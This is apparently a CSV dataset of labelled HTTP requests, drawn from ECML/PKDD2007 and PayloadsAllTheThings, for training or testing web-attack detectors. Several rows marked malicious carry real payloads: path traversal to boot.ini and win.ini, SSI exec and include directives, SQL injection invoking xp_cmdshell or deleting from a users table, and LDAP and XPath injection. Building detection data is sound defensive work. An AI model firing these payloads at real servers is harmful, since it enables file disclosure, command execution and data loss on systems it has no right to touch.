attack_type,difficulty_bucket,difficulty_score,label,raw_request,request_id,request_len,sample_id,source_dataset,source_payload
,hard,-2.0,benign,"GET /fRe/dPzeXRbTH/snmtye/kU9kO_kCpXBwqSwmC/eSryBCkLR/dcBtIeaw/NZZWetcFIOF/ortriedhgtiEwtu6he/DE0QsystemUpJsDdtelnet/64/eSZ@wGQnK6Ud7TqH.sh? HTTP/1.0
Host: www.enooohH.net:89735
Connection: close
Accept: text/*;q=0.2
Accept-Charset: *;q=0.9
Accept-Encoding: gzip;q=0.7, identity, deflate, compress
Accept-Language: oe2o-d;q=0.0, fa-cDMwddb
Cache-Control: no-store
Client-ip: 254.182.73.170
Cookie: hze9h8hr2an=h;pheeohfaSt3n=683733;1atreoYc2=ngcctNieaEsae
Cookie2: $Version=""72""
Date: Thu, 25 Sep 08 21:02:21 UTC
ETag: ""nB_D5UyypLYa6kJ""
Expect: nses3
From: rntqivt@uiudd.fr
If-Modified-Since: Thu, 21 Aug 08 03:42:42 UTC
If-Unmodified-Since: Wed, 11 Apr 07 14:17:38 UTC
If-Match: *
If-None-Match: *
If-Range: Mon, 04 Aug 08 19:11:02 CET
Max-Forwards: 6664
MIME-Version: 8.7
Pragma: no-cache
Proxy-Authorization: NTLM ckRTdG5mZXJvVXNvc2VvZ0cydGV4TG95MXJ4cmYyb2Zib25jaWNrZWV5YXJpMA==
Authorization: Digest nc=20BD76F5
Range: 323-
Referer: http://www.dfAle.uk/ohefd/tGdH6.dll
TE: gzip;q=0.8,deflate,trailers
Trailer: From
User-Agent: Mozilla/5.3 (X11; U; Unix 5.3; rm-6t; rv:2.1.0) Gecko/82427432
UA-CPU: PowerPC
UA-Disp: 363,234,8
UA-OS: Windows 98
UA-Color: color16
UA-Pixels: 3057x063
Via: HTTP/1.8 71.178.44.82:2223, taa4o6/3.3 www.ryaa.shtml, FTP/3.3 9.181.96.171:76
Transfer-Encoding: compress
Upgrade: rae/8.5, ne4/3.3, e4ck/8.2, 0teaus/2.2
Warning: 649 www.aAvheed.png ""dS6Fnimdaari"" 
X-Forwarded-For: 151.135.237.72
X-Serial-Number: 28931730
----: -----------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",23809,1557,xml_test-23809,ECML/PKDD2007,
Path Traversal,medium,,malicious,"POST /search HTTP/1.1
Host: app.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Connection: close

path=/..%u2216..%u2216..%u2216..%u2216boot.ini&id=2086",,218,patt-path-traversal-1086,PayloadsAllTheThings,/..%u2216..%u2216..%u2216..%u2216boot.ini
,hard,-2.0,benign,"GET /6IdaeRimm.cgi?eiiC=7jhnnrromct&pywtfmaa=mw3b&lrnd=jorn9q3msnrepi&awtpetmernpHc=e&E5ip=tpi4nla9osEei50enb&emolerjee=ncar&unle3=iite+-2&rjtsfbd=%25ead&deieieni=smttmpexec+9z+auebsefqsnhttp HTTP/1.1
Host: 208.117.204.88:80
Connection: close
Accept: */*
Accept-Charset: windows-1258;q=0.2, x-mac-ce;q=0.9, x-mac-arabic;q=0.2, x-mac-ce;q=0.7, utf-8
Accept-Encoding: identity
Accept-Language: *
Cache-Control: only-if-cached
Client-ip: 64.33.164.229
Cookie: i94Intie=iaobo21tad0ws6w
Cookie2: $Version=""954""
Date: Sun, 01 Jan 06 19:08:26 GMT
ETag: W/""t15mmUNACPbF9yvF1h8d""
Expect: npeo
From: Hocan@osthutarg1.biz
If-Modified-Since: Tue, 24 Mar 09 19:28:45 UTC
If-Unmodified-Since: Sun, 27 Sep 09 12:15:29 UTC
If-Match: *
If-None-Match: *
If-Range: *
Max-Forwards: 409
MIME-Version: 8.3
Pragma: no-cache
Proxy-Authorization: Basic b3RUZ3Jtcjplcm9M
Authorization: NTLM cmllZWkzY3RpcnNldGlzZG93dGVlZWlvcjFub2RzdHRsUm1lZA==
Range: 189-,863-
Referer: http://www.ptol.fr/bsemUel/fge7/seahey/enngie/G5aniAd.mpeg
TE: chunked;q=0.9,trailers
Trailer: Accept
User-Agent: oEp@Pc0@ http://www.ecefm.biz
UA-CPU: Sparc
UA-Disp: 519,575,16
UA-OS: Windows NT
UA-Color: color32
UA-Pixels: 0764x660
Via: HTTP/3.2 200.100.236.172, i1t/6.7 48.142.249.33:18
Transfer-Encoding: hebjE; Shtkw2=Rwfj
Upgrade: raife3/4.4, tde/7.8, hre/2.4, wcct/1.7
Warning: 770 123.137.130.236 ""6enewerc5oeejdr"" ""Tue, 23 Aug 05 16:07:21 CET""
X-Forwarded-For: 73.70.52.35
X-Serial-Number: 026545042
----: -------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",23108,1585,xml_test-23108,ECML/PKDD2007,
SSI,medium,,malicious,"GET /login?username=<!--#include file=""..\..\web.config"" --> HTTP/1.1
Host: demo.local
User-Agent: python-requests/2.31
Accept: */*
Connection: close",,153,patt-ssi-0649,PayloadsAllTheThings,"<!--#include file=""..\..\web.config"" -->"
SQLi,medium,3.0,malicious,"POST /eqasmthea1alu5a/nE@p3BhzfOc./yv8a42ts7da/_KUodLcatkuLhwp-4/fxlIeEx0/schoao2t8iAkbnchoqe/py.A.1jmXX_c3Bo/e3anS/tSg@yxJo343zSy/rToontpEvastEyody6/ejl/8w_.js? HTTP/1.1
Content-Length: 57
Content-Language: hi,nenaisne
Content-Encoding: compress
Content-Location: http://www.sldgilu.it/npohEtga/edoe.sh
Content-MD5: c2k2NGRvaXkwd2h5ZGNlbA==
Content-Type: application/x-www-form-urlencoded
Expires: Wed, 28 Oct 09 17:39:24 UTC
Last-Modified: Mon, 30 Nov 09 04:09:04 GMT
Host: 210.13.167.111
Connection: close
Accept: video/quicktime;q=0.9, image/gif
Accept-Charset: *;q=0.5
Accept-Encoding: 
Accept-Language: *
Cache-Control: no-cache
Client-ip: 161.91.18.4
Cookie: rnsseeOyn=yerhsoeyeorno0oz;lpCmbtsiie=0127904
Cookie2: $Version=""9""
Date: Thu, 26 Feb 04 05:36:00 GMT
ETag: ""leLIR_bfgo22sOQ""
Expect: wObo=kcnn
From: svetgtH@ellbmBnam.fr
If-Modified-Since: Sat, 19 Nov 05 24:53:29 CET
If-Unmodified-Since: Sun, 04 Jan 04 17:26:10 GMT
If-Match: *
If-None-Match: ""a_YCkpd2EOy2bNf8ohzt""
If-Range: ""dfAkBc5BPKkPXjMlYg""
Max-Forwards: 65
MIME-Version: 1.3
Pragma: no-cache
Proxy-Authorization: Digest uri=http://www.qaseCc.net/doze/ikttvm/5wrye.js
Authorization: Digest realm
Range: 8443-378,0047-
Referer: /emTjlm/4Ssrot/z4loa/uiioetd.cgi
TE: deflate;q=0.2
Trailer: Date
User-Agent: Mozilla/3.1 (Windows; U; Windows NT 1.1; es-ad; rv:4.4.6) Gecko/91751708
UA-CPU: MIPS
UA-Disp: 338,3350,8
UA-OS: Mac OS X
UA-Color: color32
UA-Pixels: 738x118
Via: FTP/2.7 245.246.44.104, etnnnl/3.4 62.104.67.91:17
Transfer-Encoding: gzip
Upgrade: oin5s/2.1, itrt/4.7, tsm/7.1
Warning: 671 145.233.120.251 ""tiua3dtweorond5gt"" 
X-Forwarded-For: 12.79.200.187
X-Serial-Number: 9168693821015244526
----: --------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~

trnIumrnrgdsitt=OR     'Snnis0' IN    (''   )",41447,1834,xml_test-41447,ECML/PKDD2007,
SSI,medium,,malicious,"POST /profile HTTP/1.1
Host: demo.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Connection: close

path=<!--#exec cmd=""whoami"" -->&id=1664",,205,patt-ssi-0664,PayloadsAllTheThings,"<!--#exec cmd=""whoami"" -->"
Path Traversal,medium,,malicious,"POST /profile HTTP/1.1
Host: demo.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Connection: close

name=/../../../../../../../../../../../boot.ini&id=2112",,212,patt-path-traversal-1112,PayloadsAllTheThings,/../../../../../../../../../../../boot.ini
SSI,medium,,malicious,"POST /comments HTTP/1.1
Host: demo.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Connection: close

search=<!--#exec cmd=""whoami"" -->&id=1692",,198,patt-ssi-0692,PayloadsAllTheThings,"<!--#exec cmd=""whoami"" -->"
SQLi,medium,3.0,malicious,"POST /edBf9/4Olvar2MS8MSDeZz/0inputezQGZWN9ibgsoundlg/ruIV7b0@YJdAD/HiibkemrhTo9irns/Z_ximgmcmdJrIftp4a/te7OoOsbcwteaoe7kwon.bin? HTTP/1.0
Content-Length: 146
Content-Language: ccnlrh,brah6
Content-Encoding: identity
Content-Location: http://www.shhisbsP.com/tChn/Oouige/herncA8.php3
Content-MD5: Y2VzenNhc1FzeHREc21pYQ==
Content-Type: application/x-www-form-urlencoded
Expires: Fri, 11 Apr 08 14:13:11 UTC
Host: www.patou.de
Connection: aeser
Accept: */*
Accept-Charset: *;q=0.7
Accept-Encoding: identity;q=0.6, deflate, gzip;q=0.8
Accept-Language: *
Cache-Control: luo='hqntesd'
Client-ip: 147.114.125.183
Cookie: daE0dere5si=;  EXEC('UNI'+'ON'+' '+'SEL'+'ECT     'tae6',0673,416,'Bpeewfcng',9    FROM     ar);zrce=hlike31;tGtie=1940;hptge=fn1tmeVadnrF
Cookie2: $Version=""52""
Date: Sat, 05 Aug 06 02:21:07 GMT
Expect: mwlme
From: hoc9Nr@eleoJto.be
If-Modified-Since: Wed, 06 Oct 04 10:37:15 GMT
If-Unmodified-Since: Tue, 25 Mar 08 17:30:06 CET
If-Match: ""iI_Z0rYtfWNl4xljebNs""
If-None-Match: ""92cn4Z@9suWRgVpP-M""
Max-Forwards: 0
Pragma: Znt=sosetpA
Referer: /qmtSots/outnU/tsif.mpg
TE: deflate,chunked;q=0.4,gzip;q=0.2
User-Agent: uqDdeszzD http://www.ceiiaato.it
Via: 2.0 63.39.17.125
Upgrade: ttr/1.8, nv1tyf/4.9
X-Serial-Number: 6456587299830575773

pe2pczena=ac%5Cx&rrt=cg2s&Ha4or=is&B%uRxp_=hlrloghydS++qiuxr&lredLetoiihzss=9281717620&wwuettUte=71&YqvEecho=34&srekoW=5p21EQ0V&maeiboAtzaE=+etcfR",42786,1435,xml_test-42786,ECML/PKDD2007,
Path Traversal,medium,,malicious,"POST /profile HTTP/1.1
Host: app.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Connection: close

username=./\/././\/././\/././\/././\/./boot.ini&id=2159",,220,patt-path-traversal-1159,PayloadsAllTheThings,./\/././\/././\/././\/././\/./boot.ini
SQLi,medium,4.5,malicious,"GET /rrlomasnc3/d4coBOTQ3/nh59wj-hdiKry@.php4?tEbStxj=TH&nehwnquthystt=haalet3czt6tf&nv=8anluecQhn&ee1uoaihod7Fota=6760&Ytuo-iFt=ioihi&4cMurY8wtu-v=ubodnetntco7&ndtno0oa=41135466&0iweerdaaay=62&oDfhn=14214&woBooa=cialuw6cenHuugsk&othgeuSbjats0t=gmeR0-OHW3AD HTTP/1.1
Host: 51.220.235.213:389
Connection: close
Accept: text/*;q=0.7
Accept-Charset: *;q=0.3
Accept-Encoding: 
Accept-Language: 0sVtatep-iups;q=0.6, nr5i-scniy;q=0.2, fnMEs5m-hi4et, shye-iH6o
Cookie: DM8_W7gKstdinVN=28950537;htli5ypeWesget=n NAewksl\6jjfss ct;EeaJ=';EXEC    master.dbo.xp_cmdshell 'cmd.exe;99=48953227;dLf1d=oAe]lintsEnNincer
Date: Sun, 09 Jan 05 22:42:26 GMT
If-Unmodified-Since: Mon, 25 May 09 19:25:42 CET
Authorization: Basic eTlpc2FuYnM6azZwYWgwaUU=
Referer: /id0xl7/tdAeenc/hiamee6/cwH9tdeo.tiff
User-Agent: Mozilla/6.6 (Machintosh; U; Mac OS X 5.3; qs-iy; rv:5.5.1) Gecko/13602152
UA-Disp: 0171,5038,8
Transfer-Encoding: compress
----: ------------------------------------",35027,973,xml_test-35027,ECML/PKDD2007,
SQLi,medium,4.0,malicious,"GET /ns/eh.asp?cw9xsmub6trlEo=ercpoabodycoEoIh&e8emi4eei7d=85279&4A4K=+%5D HTTP/1.1
Host: 220.228.51.195:49198
Connection: close
Accept: */*
Accept-Charset: windows-1252;q=0.8, iso-8859-7, x-mac-roman
Accept-Encoding: deflate;q=0.7, compress;q=0.6
Accept-Language: *;q=0.8
Cache-Control: no-store
Client-ip: 87.232.160.255
Cookie: 3xdGrcpOnp_y=OR    '6Ncaar'     LIKE    'Sim%'
Cookie2: $Version=""8""
Date: Sat, 23 Jun 07 03:35:26 GMT
ETag: W/""cKDNr8CH.0z91yq@kFD""
Expect: 100-continue
If-Modified-Since: Fri, 08 Jan 10 14:17:08 GMT
If-Unmodified-Since: Tue, 15 Jun 04 11:16:32 GMT
If-Match: ""mRXWxRNuSpDXscj""
If-None-Match: ""BAhw7m.T1rD981SwL""
If-Range: Sat, 21 Aug 04 11:01:08 CET
Max-Forwards: 6
Pragma: no-cache
Authorization: t7ai Stotedm=dMnQ7iEg
Range: 481797-7272,-0
Referer: http://www.tenha.cz/oiaown/piat.nsf
TE: trailers
Trailer: From
User-Agent: Mozilla/6.6 (compatible; Konqueror/5.5; Win98; nys0a)
Transfer-Encoding: deflate
Upgrade: lrh3x/8.6
Warning: 221 www.ieHmnseN.shtml ""tc0exeLby"" ""Thu, 15 Apr 10 21:19:31 UTC""
~~~~~: ~~~~~~~~~~~~~~~~",41336,1085,xml_test-41336,ECML/PKDD2007,
,hard,-2.0,benign,"GET /heoeaisitsrwithtnop/C-Hhs6CN25/eaM/lux/rad1L/aGAhome.7mP/egyJosfsnnim/cC7T/.0Ws/Laijbody8.asp?ht1umwBrtrep=yjogc&lfdmneeeitbrte=71500947&abosmneolxeyc=neu&021Tbody5=83440&ey4siema=Ecimailt+oe%3Asho7a&NVQpe=eeD0NHL89&g9netcat-CY2mwLor_=aoue54Tafm&zh1F=38&4rownl5=6498223303&b4t7=%28&llreee6id=passwd%3Bs%5CeEl%24+woptMp&LxBinputMASM=waUe HTTP/1.0
Host: www.nehwrerq.it:80
Connection: atniyoo
Accept: video/*;q=0.4
Accept-Charset: *
Accept-Encoding: deflate
Accept-Language: sssm-h8E
Cache-Control: only-if-cached
Client-ip: 103.87.128.39
Cookie: nsptr=e;1UIobjectpJx8ZOy=nuoeaa6;dtirchgz=hdcQbjtdIt;0m7a=enYjed6LCe/eE;ottEa0smNRrLao5=s4Dmctmp;PZsdapngetrTi0=ledkE.B
Cookie2: $Version=""10""
Date: Thu, 26 May 05 05:09:25 UTC
ETag: W/""GVWaA9DCuXqqqJrb""
Expect: s0roy7=mAGvNo;ttbher=aamM
From: l14gyjst@isddra.be
If-Modified-Since: Sat, 03 Apr 04 16:00:14 GMT
If-Unmodified-Since: Sat, 22 Aug 09 16:23:42 UTC
If-Match: *
If-None-Match: *
If-Range: Mon, 12 Jul 04 18:08:13 CET
Max-Forwards: 793
MIME-Version: 9.9
Pragma: no-cache
Proxy-Authorization: 5xRae onteCdsi=onReodh
Authorization: Digest username=""n5leeaKr""
Range: 2800-0168
Referer: /Tzar/tbsthnn/estwn/ere8u.mspx
TE: deflate,trailers,deflate;q=0.5
Trailer: Host
User-Agent: Mozilla/5.7 (X11; U; Unix 6.0; ir-wn; rv:1.4.0) Gecko/97566866
UA-CPU: 68000
UA-Disp: 2989,0086,16
UA-OS: Windows 98
UA-Color: color32
UA-Pixels: 249x219
Via: HTTP/2.0 www.8atr.gif
Transfer-Encoding: ulxe; ncrci2aa=bO5wd
Upgrade: enfzlm/9.3, RMow/0.2, Fmr1/3.8, tsi/2.4, pil2/2.5
Warning: 384 www.ihOsnx.gif:86157 ""3mwtkhlueagtttZwo"" 
X-Forwarded-For: 227.198.34.58
X-Serial-Number: 27260320301
----: ---------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",18990,1774,xml_test-18990,ECML/PKDD2007,
,hard,-2.0,benign,"GET /isaosdeh/4PVCBXj/BhtpassoLupdatecopyRu0a@IpiW/etcm24j/rbJP0hxVpV55e/cpewnIecn4foh/zpyRFWRfqK.asmx? HTTP/1.1
Host: 169.52.46.231:5
Connection: uctpx
Accept: text/*;q=0.4, audio/basic
Accept-Charset: windows-874;q=0.2
Accept-Encoding: *
Accept-Language: a5joen-a, tfhqo-kreE7i
Cache-Control: no-cache
Client-ip: 199.216.21.216
Cookie: uavitaGg=70858;nb4eg6ra2=btnetcatv;as=d0tZ6;Aod3dkphe=de HlCl
Cookie2: $Version=""17""
Date: Sat, 01 Apr 06 09:28:49 CET
ETag: ""e6j.ieGuWuJaBrxB9VF""
Expect: awianDu=fnketir;ruzioroe
From: rain@uiqt.com
If-Modified-Since: Tue, 15 Jun 04 20:53:09 GMT
If-Unmodified-Since: Thu, 14 May 09 08:33:52 UTC
If-Match: *
If-None-Match: *
If-Range: Wed, 29 Oct 08 07:46:24 GMT
Max-Forwards: 35
MIME-Version: 6.1
Pragma: ica4tt='r'
Proxy-Authorization: NTLM dHZ1YWRsbHI4ZWFzbGFzb21peTRuUG9uT2VvZGNkcmRwdEZlaDI5b0ViYWFpZDg=
Authorization: Digest opaque=""6waerney""
Range: 577564-305453
Referer: http://or2de.net/uleo.jsp
TE: gzip
Trailer: Upgrade
User-Agent: wBuBuIO http://www.Aedim6r.cz
UA-CPU: StrongARM
UA-Disp: 496,778,32
UA-OS: Windows 95
UA-Color: color32
UA-Pixels: 3909x9569
Via: FTP/6.0 www.irem.shtml
Transfer-Encoding: compress
Upgrade: esen47/9.3, o2g/8.8, eeLM/5.1
Warning: 366 163.128.154.181 ""5ioUq"" 
X-Forwarded-For: 41.168.99.7
X-Serial-Number: 935852027842714359
----: -----------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",29541,1445,xml_test-29541,ECML/PKDD2007,
SQLi,medium,3.5,malicious,"GET /2ry6tnaio9slojtt/J5n_UZwi2/naoeogrnetu/uBbBavg.9T4yUxbe/PUz/It.jpeg?SwMmtEcr=%5D%27ebs&outwp=ss+%29&wrp1OtRib=XeeMrn&91c9gW=lrR&stpouOeazieFr=eyate&dpanetlenosroC=1024616&Abtt=u+m&wo=eeoptare2oawe0T%40oaue8I&TmochaexecH=e_On19i&vJBwPHOz=pdA3ria%7E&ritghni1id7h=tFkNtKC43do&upcRj0af=%25&NADGVconnecth=%27%3BEXECmaster.dbo.xp_cmdshell%27cmd.exe HTTP/1.1
Host: 88.70.111.243
Connection: close
Accept: audio/*;q=0.6, image/*;q=0.4
Accept-Charset: *;q=0.6
Accept-Encoding: identity;q=0.1
Accept-Language: *
Cache-Control: no-transform
Client-ip: 175.67.198.190
Cookie: Zbrbi=rtheeo\eimz;cwiemlinose=otheeT;ypyDniae2Oitk=bmoseibtixtermr;zsnkedqSmeju=eQWV6.Hef
Date: Tue, 21 Jun 05 09:01:10 CET
ETag: W/""0@NBRWxhqqgere4xA""
Expect: 100-continue
If-Modified-Since: Sun, 13 Sep 09 06:34:07 UTC
If-Unmodified-Since: Wed, 05 Jan 05 16:51:01 CET
If-Match: ""@E7Ef4CY-tUdMPWb1R5""
If-None-Match: ""GKtrY63.V_2TGqIQgc5""
If-Range: *
Max-Forwards: 9872
MIME-Version: 0.3
Pragma: th=lhhn
Proxy-Authorization: Basic dDlhaW46dXFjcA==
Authorization: nMsev rhec=oooQeenc
Range: -373777
Referer: http://www.Story9lk.de/inxo/dsltoeb1/Taxei/mnrS/roibl5.nsf
TE: trailers
User-Agent: Mozilla/4.6 (X11; U; SunOS sun4u 9.5; 0a-ug; rv:7.8.7) Gecko/37351310
UA-CPU: StrongARM
UA-Color: color32
Via: FTP/1.4 114.160.20.122, 6.5 149.29.32.120, wayos/7.9 www.edTiEew.jpeg
Transfer-Encoding: compress
Upgrade: ntza0i/5.5
----: ----------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",35044,1510,xml_test-35044,ECML/PKDD2007,
LDAP Injection,medium,5.0,malicious,"GET /op/dpez/iTtr5yoetttebltseee/9TAamaNeNidntcf.shtml? HTTP/1.0
Host: 3.229.220.182:09592
Connection: aEsaa
Accept: image/gif;q=0.4
Accept-Charset: iso-8859-4, x-mac-ce;q=0.5, iso-8859-2
Accept-Encoding: 
Accept-Language: a-ae
Cache-Control: only-if-cached
Cookie: nwise5l1metlT3O=) (| (   cn=*o'brien*)(mail   =*o 'brien*  ) 
Date: Thu, 07 Jun 07 21:17:06 CET
ETag: W/""p_Vvkozo6f9NxCBX""
Expect: ehadshmp=l0yr9rJe;1tulta=a5STe
If-Modified-Since: Thu, 22 Feb 07 10:49:45 GMT
If-Unmodified-Since: Sat, 27 Sep 08 18:52:00 GMT
If-Match: ""tFASbYE9J2AU8haTV""
If-None-Match: *
If-Range: *
Max-Forwards: 149
MIME-Version: 9.7
Pragma: mIf=ihkee2
Proxy-Authorization: Digest nonce
Authorization: Digest nc=E29dD4a9
Range: 69-,-199
Referer: http://qhrrrs.ch/8kfmtb0/ahd4tewi.pl
TE: trailers,trailers
Trailer: Accept-Language
User-Agent: Mozilla/8.5 (Machintosh; U; PPC Mac OS X 6.7; ls-uk; rv:4.7.9) Gecko/45780089
UA-CPU: Sparc
Via: p8r9/1.1 www.arnp.gif
Transfer-Encoding: matero
Upgrade: ohn/4.2
Warning: 265 157.39.223.179 ""hiCm"" 
----: -------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",36874,1128,xml_test-36874,ECML/PKDD2007,
SQLi,hard,1.5,malicious,"PUT /aieqm/0zirrt2rBe0liE/sBovwJm1/hhe/BwAQFF58linkJ/oG1YCR/6nfocrrg/e9yNRxEP_XS-BiGxO9/tb.msf? HTTP/1.1
Content-Length: 153
Content-Language: g
Content-Encoding: gzip
Content-Location: http://www.ra7e.de/wp6uv/eo1dn/asjaus.png
Content-MD5: OGhuZzVENE5SYW9ubm9Scg==
Content-Type: application/x-www-form-urlencoded
Last-Modified: Thu, 11 May 06 20:23:40 CET
Host: 9.44.110.34
Connection: close
Accept: */*
Accept-Charset: *
Accept-Encoding: gzip, identity;q=0.6
Accept-Language: aa0gxmr-d
Cache-Control: es=e6e7
Client-ip: 172.28.50.0
Cookie: rcrgE9194i=9807713;rys02iwX=lulri3nrh48
Cookie2: $Version=""111""
Date: Sat, 19 Mar 05 24:07:02 GMT
If-Unmodified-Since: Wed, 11 Feb 04 18:25:15 UTC
If-Match: *
Max-Forwards: 9230
Referer: http://www.mBg5.com/aPaaa.wav
TE: trailers,deflate,trailers
User-Agent: Mozilla/0.9 (Machintosh; U; Mac OS X 1.2; sl-23; rv:7.6.6) Gecko/66547309
Via: 1.9 www.opea.tiff
Transfer-Encoding: compress
Upgrade: ied/4.5, ed6tn/2.3, fotom/3.2, ooni/6.1, hhIt/6.5

nx1nddib=1&b62eeVooah=jcokl65&e8dadmstr=ausotnk'   );DELETEFROMusersWHEREupper(username)    =  upper(   'admin&5hsreteehNdoiF=124&hb=ao-N",41532,1152,xml_test-41532,ECML/PKDD2007,
XPath Injection,medium,,malicious,"POST /comments HTTP/1.1
Host: demo.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Connection: close

redirect=' and count(/comment())=1 and '1'='1&id=1405",,211,patt-xpath-injection-0405,PayloadsAllTheThings,' and count(/comment())=1 and '1'='1
SQLi,medium,4.0,malicious,"GET /tjr/nxL/yVLh/tGjByuAPHx5eyAXDmY/i_AyoL1/mLnjGs.shtml?e5litfEsl5NEk=4670&idUF_k=3Btn8tootfa&ehyL2at0t=e8i&agwinntIkQME=09953374&tesFrlOmqe9eh=yispg9ybsaar HTTP/1.0
Host: www.ytiitm.cz
Connection: close
Accept: */*;q=0.1
Accept-Charset: macintosh;q=0.5, windows-1255
Accept-Encoding: gzip, compress;q=0.1
Accept-Language: d-heni, k-nQje7;q=0.2, dh-r;q=0.1
Cache-Control: uOddEhc=j
Client-ip: 72.36.50.94
Cookie: hirp=exec    xp_cmdshell  '""7oiNd4""    >> script.vbs'
Cookie2: $Version=""11""
Date: Sun, 14 Aug 05 07:45:02 CET
ETag: W/""-ug5NWVnwdO6MSNr""
From: 0nhkngwk@nPuAseshox.org
If-Modified-Since: Wed, 28 Apr 04 11:08:06 GMT
If-Match: *
If-None-Match: ""FZvavhJoOipm9l0G""
If-Range: Thu, 29 Oct 09 12:00:06 GMT
Max-Forwards: 338
Pragma: idalT=eqtrE
Authorization: Digest opaque=""Ndnm""
Range: 15178-344,925-637476,9-
Referer: /vonoiiuo/tTtevp/oIer6ee/asbjttg.aspx
TE: chunked;q=0.4,trailers,gzip
User-Agent: Mozilla/7.9 (Windows; U; Win 9x 7.5; oe-9l; rv:3.8.0) Gecko/16964849
UA-CPU: x86
UA-Disp: 533,4193,32
X-Serial-Number: 7418181205236277
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",40987,1129,xml_test-40987,ECML/PKDD2007,
Path Traversal,medium,4.0,malicious,"GET /error/\..\..\..\..\winnt\win.ini? HTTP/1.1
Host: 39.100.201.70
Connection: keep-alive
Accept: application/*, video/*, text/*;q=0.6
Accept-Charset: *
Accept-Encoding: 
Accept-Language: *
Cache-Control: no-cache
Client-ip: 189.4.113.141
Cookie2: $Version=""3""
Date: Sun, 13 Jan 08 24:05:43 UTC
Expect: 100-continue
If-Modified-Since: Fri, 18 Jun 04 21:07:23 UTC
If-Match: ""BL6_@8kSIXD9@TvuYy""
If-None-Match: *
If-Range: ""8XV@_2tDEk.7skyj.Qd""
Max-Forwards: 4923
Pragma: no-cache
Authorization: Basic ZGRhaGVlbTo4c3RlaA==
Referer: http://www.etNtxAs1.cz/seH9hi/d8ekee/i17pa.sh
TE: trailers,trailers,gzip
Trailer: Accept-Language
User-Agent: Mozilla/9.6 (X11; U; Solaris 0.9; et-85; rv:9.4.6) Gecko/50801753
Via: 1.7 www.sqetltr.jpg, 5.3 www.borc.jpg:33
Upgrade: sst2oo/6.7, eatt/1.0",36206,806,xml_test-36206,ECML/PKDD2007,
SSI,medium,,malicious,"POST /api/items HTTP/1.1
Host: intranet.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Connection: close

file=<!--#exec cmd=""whoami"" -->&id=1700",,202,patt-ssi-0700,PayloadsAllTheThings,"<!--#exec cmd=""whoami"" -->"
LDAP Injection,medium,,malicious,"POST /profile HTTP/1.1
Host: app.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
Connection: close

comment=r = requests.get(""http://ctf.web?action=dir&search=admin*)(password="" + flag + char)&id=1171",,266,patt-ldap-injection-0171,PayloadsAllTheThings,"r = requests.get(""http://ctf.web?action=dir&search=admin*)(password="" + flag + char)"
